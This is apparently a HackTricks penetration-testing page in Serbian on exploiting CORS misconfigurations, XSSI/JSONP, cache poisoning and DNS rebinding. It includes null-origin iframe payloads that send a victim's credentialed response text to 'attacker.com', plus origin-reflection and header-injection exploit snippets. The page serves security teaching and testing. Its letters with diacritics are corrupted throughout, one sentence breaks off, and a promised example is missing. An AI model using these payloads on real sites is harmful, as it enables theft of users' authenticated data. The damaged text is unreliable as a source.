# CORS - Neta캜ne konfiguracije i zaobila쬰nje

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## 맚a je CORS?

Cross-Origin Resource Sharing (CORS) standard **omogu캖ava serverima da defini코u ko mo쬰 pristupiti njihovim resursima** i **koje HTTP metode zahteva su dozvoljene** sa spoljnih izvora.

Politika **iste porekla** zahteva da **server koji zahteva** resurs i server koji **hostuje** resurs dele isti protokol (npr. `http://`), ime domena (npr. `internal-web.com`) i **port** (npr. 80). Prema ovoj politici, samo veb stranice sa istog domena i porta imaju dozvoljen pristup resursima.

Primena politike istog porekla u kontekstu `http://normal-website.com/example/example.html` je prikazana na slede캖i na캜in:

| Pristupani URL                             | Dozvoljen pristup?                  |
| ----------------------------------------- | ---------------------------------- |
| `http://normal-website.com/example/`      | Da: Identi캜an protokol, domen i port |
| `http://normal-website.com/example2/`     | Da: Identi캜an protokol, domen i port |
| `https://normal-website.com/example/`     | Ne: Razli캜it protokol i port      |
| `http://en.normal-website.com/example/`   | Ne: Razli캜it domen               |
| `http://www.normal-website.com/example/`  | Ne: Razli캜it domen               |
| `http://normal-website.com:8080/example/` | Ne: Razli캜it port*                |

*Internet Explorer zanemaruje broj porta prilikom primene politike istog porekla, 캜ime se omogu캖ava ovaj pristup.

### `Access-Control-Allow-Origin` zaglavlje

Ovo zaglavlje mo쬰 dozvoliti **vi코e porekla**, vrednost **`null`** ili specijalni karakter **`*`**. Me캠utim, **nijedan pregleda캜 ne podr쬬va vi코e porekla**, a upotreba specijalnog karaktera `*` je podlo쬹a **ograni캜enjima**. (Specijalni karakter `*` mora biti kori코캖en samostalno, a njegova upotreba zajedno sa `Access-Control-Allow-Credentials: true` nije dozvoljena.)

Ovo zaglavlje **izdaje server** kao odgovor na zahtev za resurs iz drugog domena koji je inicirao veb stranica, pri 캜emu pregleda캜 automatski dodaje zaglavlje `Origin`.

### `Access-Control-Allow-Credentials` zaglavlje

Podrazumevano, zahtevi sa drugog domena se 코alju bez akreditacija kao 코to su kola캜i캖i ili Authorization zaglavlje. Me캠utim, server sa drugog domena mo쬰 dozvoliti 캜itanje odgovora kada se 코alju akreditacije postavljanjem zaglavlja `Access-Control-Allow-Credentials` na **`true`**.

Ako je postavljeno na `true`, pregleda캜 캖e prenositi akreditacije (kola캜i캖e, Authorization zaglavlja ili TLS klijentske sertifikate).
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
console.log(xhr.responseText);
}
}
xhr.open('GET', 'http://example.com/', true);
xhr.withCredentials = true;
xhr.send(null);
```

```javascript
fetch(url, {
credentials: 'include'
})
```

```javascript
const xhr = new XMLHttpRequest();
xhr.open('POST', 'https://bar.other/resources/post-here/');
xhr.setRequestHeader('X-PINGOTHER', 'pingpong');
xhr.setRequestHeader('Content-Type', 'application/xml');
xhr.onreadystatechange = handler;
xhr.send('<person><name>Arun</name></person>');
```
### CSRF Pre-flight zahtev

### Razumevanje Pre-flight zahteva u komunikaciji izme캠u domena

Kada se pokrene zahtev izme캠u domena pod odre캠enim uslovima, kao 코to je kori코캖enje **ne-standardne HTTP metode** (bilo koja osim HEAD, GET, POST), uvo캠enje novih **headera**, ili kori코캖enje posebne vrednosti **Content-Type headera**, mo쬰 biti potreban pre-flight zahtev. Ovaj preliminarni zahtev, koji koristi metodu **`OPTIONS`**, slu쬴 da obavesti server o namerama nadolaze캖eg zahteva izme캠u domena, uklju캜uju캖i HTTP metode i headere koje namerava da koristi.

Protokol **Cross-Origin Resource Sharing (CORS)** propisuje ovu proveru pre-flight zahteva kako bi se utvrdila izvodljivost tra쬰ne operacije izme캠u domena, proverom dozvoljenih metoda, headera i pouzdanosti porekla. Za detaljnije razumevanje uslova koji izbegavaju potrebu za pre-flight zahtevom, pogledajte sveobuhvatni vodi캜 koji pru쬬 [**Mozilla Developer Network (MDN)**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests).

Va쬹o je napomenuti da **odsustvo pre-flight zahteva ne ukida potrebu da odgovor nosi autorizacione headere**. Bez ovih headera, pregleda캜 je nesposoban da obradi odgovor izme캠u domena.

Razmotrite slede캖i prikaz pre-flight zahteva koji ima za cilj kori코캖enje metode `PUT` zajedno sa prilago캠enim headerom nazvanim `Special-Request-Header`:
```
OPTIONS /info HTTP/1.1
Host: example2.com
...
Origin: https://example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Authorization
```
Kao odgovor, server mo쬰 vratiti zaglavlja koja ukazuju na prihva캖ene metode, dozvoljeni izvor i druge detalje politike CORS-a, kao 코to je prikazano ispod:
```markdown
HTTP/1.1 204 No Content
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
```
- **`Access-Control-Allow-Headers`**: Ovaj zaglavlje specificira koje zaglavlja mogu biti kori코캖ena tokom stvarnog zahteva. Postavlja ga server da bi ozna캜io dozvoljena zaglavlja u zahtevima od klijenta.
- **`Access-Control-Expose-Headers`**: Kroz ovo zaglavlje, server obave코tava klijenta o tome koja zaglavlja mogu biti prikazana kao deo odgovora, osim jednostavnih zaglavlja odgovora.
- **`Access-Control-Max-Age`**: Ovo zaglavlje ozna캜ava koliko dugo rezultati pre-flight zahteva mogu biti ke코irani. Server postavlja maksimalno vreme, u sekundama, koje se mo쬰 ponovo koristiti informacija vra캖ena pre-flight zahtevom.
- **`Access-Control-Request-Headers`**: Koristi se u pre-flight zahtevima, ovo zaglavlje postavlja klijent da obavesti server o tome koja HTTP zaglavlja klijent 쬰li da koristi u stvarnom zahtevu.
- **`Access-Control-Request-Method`**: Ovo zaglavlje, tako캠e kori코캖eno u pre-flight zahtevima, postavlja klijent da ozna캜i koji HTTP metod 캖e biti kori코캖en u stvarnom zahtevu.
- **`Origin`**: Ovo zaglavlje automatski postavlja pregleda캜 i ozna캜ava poreklo zahteva sa razli캜itog porekla. Koristi ga server da proceni da li dolazni zahtev treba da bude dozvoljen ili odbijen na osnovu CORS politike.

Imajte na umu da obi캜no (zavisno od tipa sadr쬬ja i postavljenih zaglavlja) u **GET/POST zahtevu se ne 코alje pre-flight zahtev** (zahtev se 코alje **direktno**), ali ako 쬰lite da pristupite **zaglavljima/telu odgovora**, mora sadr쬬ti zaglavlje _Access-Control-Allow-Origin_ koje to dozvoljava.\
**Stoga, CORS ne 코titi od CSRF (ali mo쬰 biti korisno).**

### **Pre-flight zahtevi lokalne mre쬰**

1. **`Access-Control-Request-Local-Network`**: Ovo zaglavlje se uklju캜uje u zahtev klijenta da ozna캜i da je upit usmeren na resurs lokalne mre쬰. Slu쬴 kao oznaka koja obave코tava server da zahtev poti캜e iz lokalne mre쬰.

2. **`Access-Control-Allow-Local-Network`**: Kao odgovor, serveri koriste ovo zaglavlje da komuniciraju da je tra쬰ni resurs dozvoljen da se deli sa entitetima van lokalne mre쬰. Deluje kao zeleno svetlo za deljenje resursa preko razli캜itih granica mre쬰, obezbe캠uju캖i kontrolisan pristup uz odr쬬vanje sigurnosnih protokola.

**Validan odgovor koji dozvoljava zahtev lokalne mre쬰** tako캠e mora imati u odgovoru zaglavlje `Access-Controls-Allow-Local_network: true`:
```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: GET
Access-Control-Allow-Credentials: true
Access-Control-Allow-Local-Network: true
Content-Length: 0
...
```
{% hint style="warning" %}
Imajte na umu da IP adresa **0.0.0.0** na linuxu omogu캖ava **zaobila쬰nje** ovih zahteva za pristup lokalnom ra캜unaru jer se ta IP adresa ne smatra "lokalnom".

Tako캠e je mogu캖e **zaobi캖i zahteve lokalne mre쬰** ako koristite **javnu IP adresu lokalnog endpoina** (kao 코to je javna IP adresa rutera). Jer u nekoliko slu캜ajeva, 캜ak i ako se pristupa **javnoj IP adresi**, ako je to **iz lokalne mre쬰**, pristup 캖e biti odobren.


{% endhint %}

## Iskori코캖ive gre코ke u konfiguraciji

Prime캖eno je da je pode코avanje `Access-Control-Allow-Credentials` na **`true`** preduslov za ve캖inu **stvarnih napada**. Ovo pode코avanje omogu캖ava pregleda캜u da 코alje akreditive i 캜ita odgovor, 캜ime se pove캖ava efikasnost napada. Bez toga, prednost izdavanja zahteva preko pregleda캜a umesto ru캜nog izdavanja zahteva se smanjuje, jer postaje nemogu캖e iskoristiti kola캜i캖e korisnika.

### Izuzetak: Iskori코캖avanje mre쬹e lokacije kao autentifikacije

Postoji izuzetak gde mre쬹a lokacija rtve deluje kao oblik autentifikacije. To omogu캖ava kori코캖enje pregleda캜a rtve kao proxy-ja, zaobilaze캖i autentifikaciju zasnovanu na IP adresi kako bi se pristupilo aplikacijama unutar mre쬰. Ovaj metod ima sli캜nosti sa DNS prevezivanjem, ali je jednostavniji za iskori코캖avanje.

### Refleksija `Origin` u `Access-Control-Allow-Origin`

Realni scenario gde se vrednost zaglavlja `Origin` reflektuje u `Access-Control-Allow-Origin` je teorijski malo verovatan zbog ograni캜enja u kombinovanju ovih zaglavlja. Me캠utim, programeri koji 쬰le omogu캖iti CORS za vi코e URL-ova mogu dinami캜ki generisati zaglavlje `Access-Control-Allow-Origin` kopiranjem vrednosti zaglavlja `Origin`. Ovaj pristup mo쬰 uvesti ranjivosti, posebno kada napada캜 koristi domen sa imenom koje je dizajnirano da izgleda legitimno, 캜ime obmanjuje logiku validacije.
```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example.com/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='/log?key='+this.responseText;
};
</script>
```
### Iskori코캖avanje `null` porekla

`null` poreklo, koje se koristi u situacijama poput preusmeravanja ili lokalnih HTML datoteka, ima poseban polo쬬j. Neke aplikacije stavljaju ovo poreklo na belu listu kako bi olak코ale lokalni razvoj, nesvesno omogu캖avaju캖i bilo kojoj veb lokaciji da imitira `null` poreklo putem sandboxed iframe-a, 캜ime se zaobilaze CORS ograni캜enja.
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```
### Tehnike za zaobila쬰nje redovnih izraza

Kada se susretnete sa belom listom domena, klju캜no je testirati mogu캖nosti za zaobila쬰nje, kao 코to je dodavanje napada캜evog domena na belu listu domena ili iskori코캖avanje ranjivosti preuzimanja poddomena. Pored toga, redovni izrazi koji se koriste za validaciju domena mogu zanemariti nijanse u konvencijama imenovanja domena, pru쬬ju캖i dodatne mogu캖nosti za zaobila쬰nje.

### Napredne tehnike za zaobila쬰nje redovnih izraza

Obi캜no se regex obrasci fokusiraju na alfanumeri캜ke znakove, ta캜ku (.), i crticu (-), zanemaruju캖i druge mogu캖nosti. Na primer, ime domena koje je kreirano da uklju캜uje znakove koji se razli캜ito tuma캜e u pregleda캜ima i regex obrascima mo쬰 zaobi캖i sigurnosne provere. Na캜in na koji Safari, Chrome i Firefox obra캠uju donje crte u poddomenima ilustruje kako se takve razlike mogu iskoristiti za zaobila쬰nje logike validacije domena.

**Za vi코e informacija i postavki ove tehnike za zaobila쬰nje proverite:** [**https://www.corben.io/advanced-cors-techniques/**](https://www.corben.io/advanced-cors-techniques/) **i** [**https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397**](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)

![https://miro.medium.com/v2/resize:fit:720/format:webp/1*rolEK39-DDxeBgSq6KLKAA.png](<../.gitbook/assets/image (153).png>)

### Iz XSS unutar poddomena

Razvojni programeri 캜esto implementiraju odbrambene mehanizme kako bi se za코titili od iskori코캖avanja CORS-a putem bele liste domena kojima je dozvoljeno da zahtevaju informacije. Uprkos ovim merama opreza, sigurnost sistema nije neprobojna. Prisustvo 캜ak i jednog ranjivog poddomena unutar belih listiranih domena mo쬰 otvoriti vrata za iskori코캖avanje CORS-a putem drugih ranjivosti, kao 코to je XSS (Cross-Site Scripting).

Da bismo ilustrovali, razmotrimo scenario u kojem je domen `requester.com` na beloj listi za pristup resursima sa drugog domena, `provider.com`. Konfiguracija na serverskoj strani mo쬰 izgledati ovako:
```javascript
if ($_SERVER['HTTP_HOST'] == '*.requester.com') {
// Access data
} else {
// Unauthorized access
}
```
U ovom postavci, dozvoljen je pristup svim poddomenima `requester.com`. Me캠utim, ako je poddomen, na primer `sub.requester.com`, kompromitovan sa XSS ranjivo코캖u, napada캜 mo쬰 iskoristiti ovu slabost. Na primer, napada캜 koji ima pristup `sub.requester.com` mo쬰 iskoristiti XSS ranjivost da zaobi캠e CORS politike i zlonamerno pristupi resursima na `provider.com`.


### **Trovanje ke코a na serverskoj strani**

**[Iz ovog istra쬴vanja](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)**

Mogu캖e je da se, iskori코캖avanjem trovanja ke코a na serverskoj strani putem ubrizgavanja HTTP zaglavlja, izazove XSS ranjivost sa캜uvana na serveru. Ovaj scenario se de코ava kada aplikacija ne sanitizuje `Origin` zaglavlje od nelegalnih karaktera, stvaraju캖i ranjivost posebno za korisnike Internet Explorer-a i Edge-a. Ovi pregleda캜i tretiraju `\r` (0x0d) kao legitimni terminator HTTP zaglavlja, 코to dovodi do ranjivosti ubrizgavanja HTTP zaglavlja.

Razmotrite slede캖i zahtev u kojem je manipulisano `Origin` zaglavlje:
```text
GET / HTTP/1.1
Origin: z[0x0d]Content-Type: text/html; charset=UTF-7
```
Internet Explorer i Edge tuma캜e odgovor kao:
```text
HTTP/1.1 200 OK
Access-Control-Allow-Origin: z
Content-Type: text/html; charset=UTF-7
```
Dok direktno iskori코캖avanje ove ranjivosti putem slanja neispravnog zaglavlja pretra쬴va캜u nije izvodljivo, za ru캜no generisanje zahteva mogu se koristiti alati poput Burp Suite-a. Ovom metodom mo쬰 do캖i do 캜uvanja odgovora u ke코u na serverskoj strani i nenamerno ga poslu쬴vanja drugima. Ciljani payload ima za cilj da promeni karakterni skup stranice u UTF-7, kodiranje karaktera koje se 캜esto povezuje sa XSS ranjivostima zbog svoje sposobnosti da kodira karaktere na na캜in koji se mo쬰 izvr코iti kao skripta u odre캠enim kontekstima.

Za dalje 캜itanje o ranjivostima sa캜uvanog XSS-a, pogledajte [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/stored).

**Napomena**: Iskori코캖avanje ranjivosti ubrizgavanja zaglavlja HTTP-a, posebno putem trovanja ke코a na serverskoj strani, isti캜e kriti캜nu va쬹ost provere i sanitizacije svih korisni캜kih unosa, uklju캜uju캖i zaglavlja HTTP-a. Uvek koristite robustan model bezbednosti koji uklju캜uje proveru unosa kako biste spre캜ili takve ranjivosti.


### **Trovanje ke코a na klijentskoj strani**

**[Iz ovog istra쬴vanja](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)**

U ovom scenariju prime캖uje se instanca veb stranice koja reflektuje sadr쬬j prilago캠enog zaglavlja HTTP-a bez odgovaraju캖eg kodiranja. Konkretno, veb stranica reflektuje sadr쬬j uklju캜en u zaglavlje `X-User-id`, koje mo쬰 sadr쬬ti zlonamerni JavaScript, kao 코to je prikazano primerom u kojem zaglavlje sadr쬴 SVG oznaku slike dizajniranu za izvr코avanje JavaScript koda pri u캜itavanju.

Politike deljenja resursa preko razli캜itih domena (CORS) omogu캖avaju slanje prilago캠enih zaglavlja. Me캠utim, bez direktnog prikazivanja odgovora od strane pretra쬴va캜a zbog CORS ograni캜enja, korisnost takvog ubrizgavanja mo쬰 izgledati ograni캜ena. Kriti캜na ta캜ka nastaje kada se razmotri pona코anje ke코a pretra쬴va캜a. Ako nije navedeno zaglavlje `Vary: Origin`, postaje mogu캖e da zlonamerni odgovor bude ke코iran od strane pretra쬴va캜a. Naknadno, ovaj ke코irani odgovor mo쬰 se direktno prikazati prilikom navigacije na URL, zaobilaze캖i potrebu za direktnim prikazivanjem prilikom prvog zahteva. Ovaj mehanizam pobolj코ava pouzdanost napada kori코캖enjem ke코iranja na klijentskoj strani.

Da bi se ilustrovalo ovaj napad, pru쬰n je primer JavaScript koda koji je dizajniran da se izvr코i u okru쬰nju veb stranice, kao 코to je putem JSFiddle-a. Ovaj skript izvr코ava jednostavnu radnju: 코alje zahtev na odre캠eni URL sa prilago캠enim zaglavljem koje sadr쬴 zlonamerni JavaScript. Nakon uspe코nog zavr코etka zahteva, poku코ava da navigira ka ciljanom URL-u, potencijalno pokre캖u캖i izvr코avanje uba캜enog skripta ako je odgovor ke코iran bez odgovaraju캖e obrade zaglavlja `Vary: Origin`.

Evo sa쬰tog pregleda JavaScript koda koji se koristi za izvr코avanje ovog napada:
```html
<script>
function gotcha() { location=url }
var req = new XMLHttpRequest();
url = 'https://example.com/'; // Note: Be cautious of mixed content blocking for HTTP sites
req.onload = gotcha;
req.open('get', url, true);
req.setRequestHeader("X-Custom-Header", "<svg/onload=alert(1)>");
req.send();
</script>
```
## Bypass

### XSSI (Cross-Site Script Inclusion) / JSONP

XSSI, poznat i kao Cross-Site Script Inclusion, je vrsta ranjivosti koja koristi 캜injenicu da se Pravilo o istom poreklu (SOP) ne primenjuje prilikom uklju캜ivanja resursa pomo캖u oznake za skriptu. Ovo je zato 코to skripte moraju biti uklju캜ene sa razli캜itih domena. Ova ranjivost omogu캖ava napada캜u pristup i 캜itanje bilo kog sadr쬬ja koji je uklju캜en pomo캖u oznake za skriptu.

Ova ranjivost postaje posebno zna캜ajna kada je u pitanju dinami캜ki JavaScript ili JSONP (JSON sa dodatnim punjenjem), posebno kada se koriste informacije o ambijentalnoj autorizaciji poput kola캜i캖a. Prilikom zahteva za resurs sa druge hostovanje, kola캜i캖i se uklju캜uju, 캜ime postaju dostupni napada캜u.

Da biste bolje razumeli i umanjili ovu ranjivost, mo쬰te koristiti dodatak za BurpSuite dostupan na [https://github.com/kapytein/jsonp](https://github.com/kapytein/jsonp). Ovaj dodatak mo쬰 pomo캖i u identifikaciji i re코avanju potencijalnih XSSI ranjivosti u va코im veb aplikacijama.

[**Pro캜itajte vi코e o razli캜itim vrstama XSSI i kako ih iskoristiti ovde.**](xssi-cross-site-script-inclusion.md)

Poku코ajte da dodate **`callback`** **parametar** u zahtev. Mo쬯a je stranica bila pripremljena da po코alje podatke kao JSONP. U tom slu캜aju, stranica 캖e vratiti podatke sa `Content-Type: application/javascript`, 코to 캖e zaobi캖i CORS politiku.

![](<../.gitbook/assets/image (229).png>)

### Jednostavna (beskorisna?) zaobila쬰nje

Jedan na캜in za zaobila쬰nje restrikcije `Access-Control-Allow-Origin` je da se zatra쬴 od veb aplikacije da izvr코i zahtev u va코e ime i vrati odgovor. Me캠utim, u ovom scenariju, podaci o kredencijalima krajnje rtve ne캖e biti poslati jer se zahtev 코alje ka drugoj domeni.

1. [**CORS-escape**](https://github.com/shalvah/cors-escape): Ovaj alat pru쬬 proksi koji prosle캠uje va코 zahtev zajedno sa njegovim zaglavljima, dok istovremeno la쬴ra Origin zaglavlje kako bi se poklopilo sa tra쬰nom domenom. Ovo efektivno zaobilazi CORS politiku. Evo primera upotrebe sa XMLHttpRequest:

2. [**simple-cors-escape**](https://github.com/shalvah/simple-cors-escape): Ovaj alat nudi alternativni pristup proksiranju zahteva. Umesto da prosle캠uje va코 zahtev onakav kakav jeste, server vr코i sopstveni zahtev sa navedenim parametrima.

### Iframe + Popup zaobila쬰nje

Mo쬰te **zaobi캖i CORS provere** kao 코to je `e.origin === window.origin` tako 코to 캖ete **kreirati iframe** i **iz njega otvoriti novi prozor**. Vi코e informacija mo쬰te prona캖i na slede캖oj stranici:

{% content-ref url="xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### DNS Rebinding putem TTL-a

DNS rebinding putem TTL-a je tehnika koja se koristi za zaobila쬰nje odre캠enih sigurnosnih mera manipulacijom DNS zapisa. Evo kako funkcioni코e:

1. Napada캜 kreira veb stranicu i natera rtvu da je pristupi.
2. Napada캜 zatim menja DNS (IP) svoje sopstvene domene tako da pokazuje na veb stranicu rtve.
3. Pregleda캜 rtve ke코ira DNS odgovor, koji mo쬰 imati TTL (vreme 쬴vota) vrednost koja ozna캜ava koliko dugo treba smatrati DNS zapis validnim.
4. Kada TTL istekne, pregleda캜 rtve vr코i novi DNS zahtev, 코to omogu캖ava napada캜u da izvr코i JavaScript kod na stranici rtve.
5. Odr쬬vanjem kontrole nad IP adresom rtve, napada캜 mo쬰 prikupiti informacije od rtve bez slanja bilo kakvih kola캜i캖a serveru rtve.

Va쬹o je napomenuti da pregleda캜i imaju mehanizme ke코iranja koji mogu spre캜iti trenutno zloupotrebu ove tehnike, 캜ak i sa niskim vrednostima TTL-a.

DNS rebinding mo쬰 biti koristan za zaobila쬰nje eksplicitnih IP provera koje vr코i rtva ili za scenarije u kojima korisnik ili bot ostaje na istoj stranici du쬰 vreme, omogu캖avaju캖i ke코iranju da istekne.

Ako vam je potreban brz na캜in za zloupotrebu DNS rebindinga, mo쬰te koristiti usluge poput [https://lock.cmpxchg8b.com/rebinder.html](https://lock.cmpxchg8b.com/rebinder.html).

Da biste pokrenuli sopstveni DNS rebinding server, mo쬰te koristiti alate poput **DNSrebinder** ([https://github.com/mogwailabs/DNSrebinder](https://github.com/mogwailabs/DNSrebinder)). To uklju캜uje izlaganje lokalnog porta 53/udp, kreiranje A zapisa koji pokazuje na taj port (npr. ns.example.com) i kreiranje NS zapisa koji pokazuje na prethodno kreirani poddomen A zapisa (npr. ns.example.com). Svaki poddomen poddomena ns.example.com 캖e tada biti re코en od strane va코eg hosta.

Tako캠e mo쬰te istra쬴ti javno dostupan server na adresi [http://rebind.it/singularity.html](http://rebind.it/singularity.html) radi daljeg razumevanja i eksperimentisanja.

### DNS Rebinding putem **preplavljivanja DNS ke코a**

DNS rebinding putem preplavljivanja DNS ke코a je jo코 jedna tehnika koja se koristi za zaobila쬰nje mehanizma ke코iranja pregleda캜a i izazivanje drugog DNS zahteva. Evo kako funkcioni코e:

1. Prvobitno, kada rtva izvr코i DNS zahtev, dobija se IP adresa napada캜a kao odgovor.
2. Da bi zaobi코ao odbranu ke코iranja, napada캜 koristi servisni radnik. Servisni radnik preplavljuje DNS ke코, 코to efektivno bri코e ke코irano ime servera napada캜a.
3. Kada pregleda캜 rtve izvr코i drugi DNS zahtev, dobija se IP adresa 127.0.0.1, koja obi캜no se odnosi na lokalni ra캜unar.

Preplavljanjem DNS ke코a servisnim radnikom, napada캜 mo쬰 manipulisati procesom DNS rezolucije i naterati pregleda캜 rtve da izvr코i drugi zahtev, ovog puta sa 쬰ljenom IP adresom napada캜a.

### DNS Rebinding putem **ke코a**

Jo코 jedan na캜in za zaobila쬰nje odbrane ke코iranja je kori코캖enje vi코e IP adresa za isti poddomen u DNS provajderu. Evo kako funkcioni코e:

1. Napada캜 postavlja dva A zapisa (ili jedan A zapis sa dve IP adrese) za isti poddomen u DNS provajderu.
2. Kada pregleda캜 proveri ove zapise, dobija obe IP adrese.
3. Ako pregleda캜 odlu캜i da prvo koristi IP adresu napada캜a, napada캜 mo쬰 poslu쬴ti payload koji izvr코ava HTTP zahteve ka istoj domeni.
4. Me캠utim, kada napada캜 dobije IP adresu rtve, prestaje da odgovara pregleda캜u rtve.
5. Pregleda캜 rtve, kada shvati da je domen nedostupan, prelazi na kori코캖enje druge date IP adrese.
6. Pristupom drugoj IP adresi, pregleda캜 zaobilazi Pravilo o istom poreklu (SOP), omogu캖avaju캖i napada캜u da zloupotrebi ovo i prikupi i izfiltrira informacije.

Ova tehnika koristi pona코anje pregleda캜a kada se pru쬰 vi코e IP adresa za domen. Strategijskim kontrolisanjem odgovora i manipulacijom izbora IP adrese
### Ostali uobi캜ajeni zaobi캠aji

* Ako **unutra코nje IP adrese nisu dozvoljene**, mo쬯a su **zaboravili zabraniti 0.0.0.0** (radi na Linuxu i Mac-u)
* Ako **unutra코nje IP adrese nisu dozvoljene**, odgovorite sa **CNAME** na **localhost** (radi na Linuxu i Mac-u)
* Ako **unutra코nje IP adrese nisu dozvoljene** kao DNS odgovori, mo쬰te odgovoriti **CNAME-ovima na unutra코nje servise** kao 코to je www.corporate.internal.

### Oru쬵e za DNS prevezivanje

Vi코e informacija o prethodnim tehnikama zaobi캠aja i kako koristiti slede캖i alat mo쬰te prona캖i u predavanju [Gerald Doussot - State of DNS Rebinding Attacks & Singularity of Origin - DEF CON 27 Conference](https://www.youtube.com/watch?v=y9-0lICNjOQ).

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity) je alat za izvo캠enje napada [DNS prevezivanja](https://en.wikipedia.org/wiki/DNS\_rebinding). Uklju캜uje neophodne komponente za prevezivanje IP adrese DNS imena napada캜kog servera na IP adresu ciljnog ra캜unara i za pru쬬nje napada캜kih payloada radi iskori코캖avanja ranjivog softvera na ciljnom ra캜unaru.

### Stvarna za코tita od DNS prevezivanja

* Koristite TLS u unutra코njim servisima
* Zahtevajte autentifikaciju za pristup podacima
* Validirajte Host zaglavlje
* [https://wicg.github.io/private-network-access/](https://wicg.github.io/private-network-access/): Predlog da se uvek 코alje pre-flight zahtev kada javni serveri 쬰le da pristupe internim serverima

## **Alati**

**Testirajte mogu캖e neta캜ne konfiguracije CORS politika**

* [https://github.com/chenjj/CORScanner](https://github.com/chenjj/CORScanner)
* [https://github.com/lc/theftfuzzer](https://github.com/lc/theftfuzzer)
* [https://github.com/s0md3v/Corsy](https://github.com/s0md3v/Corsy)
* [https://github.com/Shivangx01b/CorsMe](https://github.com/Shivangx01b/CorsMe)

## Reference
* [https://portswigger.net/web-security/cors](https://portswigger.net/web-security/cors)
* [https://portswigger.net/web-security/cors/access-control-allow-origin](https://portswigger.net/web-security/cors/access-control-allow-origin)
* [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS)
* [https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
* [https://www.codecademy.com/articles/what-is-cors](https://www.codecademy.com/articles/what-is-cors)
* [https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors](https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors)
* [https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646](https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration)
* [https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b](https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b)


<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
